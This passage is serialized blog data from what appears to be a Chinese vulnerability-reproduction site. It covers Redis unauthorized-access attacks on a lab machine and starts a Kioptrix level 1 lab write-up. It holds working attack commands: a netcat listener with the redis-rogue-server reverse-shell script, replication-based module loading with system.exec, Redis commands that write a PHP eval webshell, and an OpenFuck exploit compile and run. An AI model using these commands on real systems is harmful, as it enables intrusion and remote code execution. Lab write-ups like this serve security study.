href=\&quot;https://github.com/n0b0dyCN/redis-rogue-server\&quot; target=\&quot;_blank\&quot; class=\&quot;group block overflow-hidden rounded-lg border border-border transition-all hover:border-primary/50 hover:shadow-md\&quot; aria-label=\&quot;GitHub - n0b0dyCN/redis-rogue-server: Redis(&lt;=5.0.5) RCE - github.com\&quot;&gt;\n    &lt;div class=\&quot;bg-card flex md:flex-col flex-row\&quot;&gt;\n      &lt;div class=\&quot;flex-1 p-4\&quot;&gt;\n        &lt;div class=\&quot;mb-2 flex items-center gap-2\&quot;&gt;\n          &lt;img src=\&quot;https://github.com/fluidicon.png\&quot; alt=\&quot;\&quot; class=\&quot;h-4 w-4 shrink-0\&quot; loading=\&quot;lazy\&quot; aria-hidden=\&quot;true\&quot;&gt;\n          &lt;span class=\&quot;text-muted-foreground truncate text-xs font-medium\&quot;&gt;github.com&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;h3 class=\&quot;text-foreground mb-2 line-clamp-2 font-semibold leading-tight\&quot;&gt;GitHub - n0b0dyCN/redis-rogue-server: Redis(&amp;#x3C;=5.0.5) RCE&lt;/h3&gt;\n        &lt;p class=\&quot;text-muted-foreground mb-3 line-clamp-2 text-sm\&quot;&gt;Redis(&amp;#x3C;=5.0.5) RCE. Contribute to n0b0dyCN/redis-rogue-server development by creating an account on GitHub.&lt;/p&gt;\n        &lt;div class=\&quot;text-primary flex items-center gap-1 text-xs\&quot;&gt;\n          &lt;span class=\&quot;truncate\&quot;&gt;https://github.com/n0b0dyCN/redis-rogue-server&lt;/span&gt;\n          &lt;svg class=\&quot;h-3 w-3 shrink-0 transition-transform group-hover:translate-x-0.5\&quot; aria-hidden=\&quot;true\&quot; viewBox=\&quot;0 0 12 12\&quot;&gt;&lt;path fill=\&quot;currentColor\&quot; d=\&quot;M4 3.5a.5.5 0 0 0-.5.5v4a.5.5 0 0 0 .5.5h4a.5.5 0 0 0 .5-.5v-.25a.75.75 0 0 1 1.5 0V8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h.25a.75.75 0 0 1 0 1.5zm2.75 0a.75.75 0 0 1 0-1.5h2.5a.75.75 0 0 1 .75.75v2.5a.75.75 0 0 1-1.5 0v-.69L7.28 5.78a.75.75 0 0 1-1.06-1.06L7.44 3.5z\&quot;&gt;&lt;/path&gt;&lt;/svg&gt; \n        &lt;/div&gt;\n      &lt;/div&gt;\n      &lt;div class=\&quot;bg-muted relative md:w-full shrink-0 aspect-1200/630 h-38\&quot;&gt;&lt;img src=\&quot;https://opengraph.githubassets.com/c425d5e75c4171d528e4cfb212b3905d02d629a35229b6ba9acfbfa096317ed6/n0b0dyCN/redis-rogue-server\&quot; alt=\&quot;GitHub - n0b0dyCN/redis-rogue-server: Redis(&lt;=5.0.5) RCE\&quot; class=\&quot;h-full w-full object-cover\&quot; loading=\&quot;lazy\&quot;&gt;&lt;/div&gt;\n    &lt;/div&gt;\n  &lt;/a&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;nc&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -lvvp&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 9999&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;./redis-rogue-server.py&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; --rhost&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; --lhost&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.4&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;后面选反弹shell&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/25.PNG&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=\&quot;方法二手动执行操作失败脚本文件\&quot;&gt;方法二：手动执行(操作失败)脚本文件&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#方法二手动执行操作失败脚本文件\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;redis-cli&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; -h&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; 192.168.124.5&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; ping&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; config set dir ./ &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 设置redis的备份路径为当前目录&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; config set dbfilename exp.so &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 设置备份文件名为exp.so，默认为dump.rdb&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; slaveof 192.168.10.1 9999 &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 设置主服务器IP和端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; module load ./exp.so &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 加载恶意模块&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; slaveof no one &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 切断主从，关闭复制功能&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; system.exec &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;whoami&#39;&lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt; # 执行系统命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; config set dbfilename dump.rdb &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 通过dump.rdb文件恢复数据&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; system.exec &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;rm ./exp.so&#39;&lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt; # 删除exp.so&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&gt;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; module unload system &lt;/span&gt;&lt;span style=\&quot;color:#6A737D;--shiki-dark:#6A737D\&quot;&gt;# 卸载system模块的加载&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;redis写webshell\&quot;&gt;redis写webshell&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#redis写webshell\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）&lt;/p&gt;\n&lt;p&gt;这里由于本地搭建，我们已经知道目录，我们把shell写入/home/bmjoker/目录下：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;shell\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dir&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; /home/bmjoker&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;config&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; dbfilename&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; redis.php&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;set&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; x&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt; \&quot;\\r\\n\\r\\n&amp;#x3C;?php phpinfo();?&gt;\\r\\n\\r\\n\&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;save&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;当数据库过大时，redis写shell的小技巧：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;php\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;&amp;#x3C;?&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;php&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; set_time_limit&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;0&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;); $fp&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;fopen&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;bmjoker.php&#39;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;,&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;w&#39;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;); &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;fwrite&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;($fp,&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;&#39;&amp;#x3C;?php @eval($_POST[\\\&quot;bmjoker\\\&quot;]);?&gt;&#39;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;); &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;exit&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(); &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;计划任务反弹shell仅适用于centos&quot;],&quot;text&quot;:[0,&quot;计划任务反弹shell（仅适用于centos）&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssh-key公钥登录服务器&quot;],&quot;text&quot;:[0,&quot;ssh-key公钥登录服务器&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;利用主从复制rce&quot;],&quot;text&quot;:[0,&quot;利用主从复制rce&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;方法一利用脚本&quot;],&quot;text&quot;:[0,&quot;方法一：利用脚本&quot;]}],[0,{&quot;depth&quot;:[0,2],&quot;slug&quot;:[0,&quot;方法二手动执行操作失败脚本文件&quot;],&quot;text&quot;:[0,&quot;方法二：手动执行(操作失败)脚本文件&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;redis写webshell&quot;],&quot;text&quot;:[0,&quot;redis写webshell&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/25.PNG&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Redis未授权访问&quot;],&quot;date&quot;:[3,&quot;2023-01-18T18:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;未授权访问&quot;],[0,&quot;Redis&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/25.PNG&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/3&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;reproduction/metasploitable-2&quot;],&quot;prevPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/kioptrix-level-1&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;# Information gathering\n```\nnetdiscover -r 192.168.124.0/24\nnmap -Pn -T4 -sV -O 192.168.124.140 -p-\nnmap --script vuln 192.168.124.140 -p-\ndirb http://192.168.124.140 /usr/share/wordlists/dirb/big.txt\n```\n# Method-1  Samba\n![](img/1679306030928.png)\nAttentions please,meterpreter is not availiable\nIt&#39;s root.There is no need to escalate privilege.\n\n# Method-2 OpenFuck mod_ssl vulnerability\n```\nsearchsploit mod_ssl 2.8.4\n```\n![](img/1679366939593.png)\n```\nsearchsploit -p 47080\n```\n\n![](img/1679366949376.png)\n\n![](img/1679366954478.png)\nWe need install libssl-dev first.\n```\ngcc -o OpenFuck 47080.c -lcrypto\n./OpenFuck\n./OpenFuck 0x6b 192.168.124.140 443 -c 40\n```\nThere are some errors in compile process.\n\n# Enclosure\n![](img/1678960944499.png)\n\n![](img/1678960950947.png)\n`Nmap scan report for bogon (192.168.124.140)\nHost is up (0.0021s latency).\nNot shown: 65529 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n| vulners: \n|   cpe:/a:openbsd:openssh:2.9p2: \n|       CVE-2002-0640   10.0    https://vulners.com/cve/CVE-2002-0640\n|       CVE-2002-0639   10.0    https://vulners.com/cve/CVE-2002-0639\n|       CVE-2002-0083   10.0    https://vulners.com/cve/CVE-2002-0083\n|       CVE-2011-2895   9.3     https://vulners.com/cve/CVE-2011-2895\n|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051\n|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924\n|       CVE-2003-1562   7.6     https://vulners.com/cve/CVE-2003-1562\n|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478\n|       CVE-2002-0575   7.5     https://vulners.com/cve/CVE-2002-0575\n|       CVE-2001-1459   7.5     https://vulners.com/cve/CVE-2001-1459\n|       CVE-2001-1380   7.5     https://vulners.com/cve/CVE-2001-1380\n|       CVE-2001-0816   7.5     https://vulners.com/cve/CVE-2001-0816\n|       SECURITYVULNS:VULN:1956 7.2     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1956\n|       CVE-2001-0529   7.2     https://vulners.com/cve/CVE-2001-0529\n|       SSV:64479       5.0     https://vulners.com/seebug/SSV:64479    *EXPLOIT*\n|       SSV:6192        5.0     https://vulners.com/seebug/SSV:6192     *EXPLOIT*\n|       SSV:60656       5.0     https://vulners.com/seebug/SSV:60656    *EXPLOIT*\n|       SSV:16847       5.0     https://vulners.com/seebug/SSV:16847    *EXPLOIT*\n|       PACKETSTORM:73600       5.0     https://vulners.com/packetstorm/PACKETSTORM:73600       *EXPLOIT*\n|       PACKETSTORM:54435       5.0     https://vulners.com/packetstorm/PACKETSTORM:54435       *EXPLOIT*\n|       EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    5.0     https://vulners.com/exploitpack/EXPLOITPACK:63CFD85A8DA29BF22328E65C685CBBA3    *EXPLOIT*\n|       EDB-ID:3303     5.0     https://vulners.com/exploitdb/EDB-ID:3303       *EXPLOIT*\n|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107\n|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243\n|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052\n|       SSV:66339       4.9     https://vulners.com/seebug/SSV:66339    *EXPLOIT*\n|       SSV:10777       4.9     https://vulners.com/seebug/SSV:10777    *EXPLOIT*\n|       EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    4.9     https://vulners.com/exploitpack/EXPLOITPACK:B5E7D30E7583980F37EF6DBC0B05FBC3    *EXPLOIT*\n|       EDB-ID:8163     4.9     https://vulners.com/exploitdb/EDB-ID:8163       *EXPLOIT*\n|       CVE-2009-0537   4.9     https://vulners.com/cve/CVE-2009-0537\n|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814\n|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327\n|       CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259\n|       SECURITYVULNS:VULN:1953 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1953\n|       SECURITYVULNS:VULN:1608 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1608\n|       SECURITYVULNS:VULN:1499 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1499\n|       SECURITYVULNS:VULN:1488 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1488\n|       SECURITYVULNS:VULN:1474 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1474\n|       SECURITYVULNS:VULN:1439 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1439\n|       SECURITYVULNS:VULN:1344 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1344\n|       SECURITYVULNS:VULN:1262 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1262\n|_      SECURITYVULNS:VULN:1233 0.0     https://vulners.com/securityvulns/SECURITYVULNS:VULN:1233\n80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n| http-enum: \n|   /test.php: Test page\n|   /icons/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|   /manual/: Potentially interesting directory w/ listing on &#39;apache/1.3.20&#39;\n|_  /usage/: Potentially interesting folder\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-trace: TRACE is enabled\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n111/tcp  open  rpcbind     2 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2            111/tcp   rpcbind\n|   100000  2            111/udp   rpcbind\n|   100024  1           1024/tcp   status\n|_  100024  1           1024/udp   status\n139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n| ssl-dh-params: \n|   VULNERABLE:\n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://weakdh.org\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|       https://www.securityfocus.com/bid/74733\n|   \n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n| ssl-ccs-injection: \n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the \&quot;CCS Injection\&quot; vulnerability.\n|           \n|     References:\n|       http://www.openssl.org/news/secadv_20140605.txt\n|       http://www.cvedetails.com/cve/2014-0224\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       https://www.openssl.org/~bodo/ssl-poodle.pdf\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.securityfocus.com/bid/70574\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)\n\nHost script results:\n| smb-vuln-cve2009-3103: \n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka \&quot;SMBv2 Negotiation Vulnerability.\&quot;\n|           \n|     Disclosure date: 2009-09-08\n|     References:\n|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not 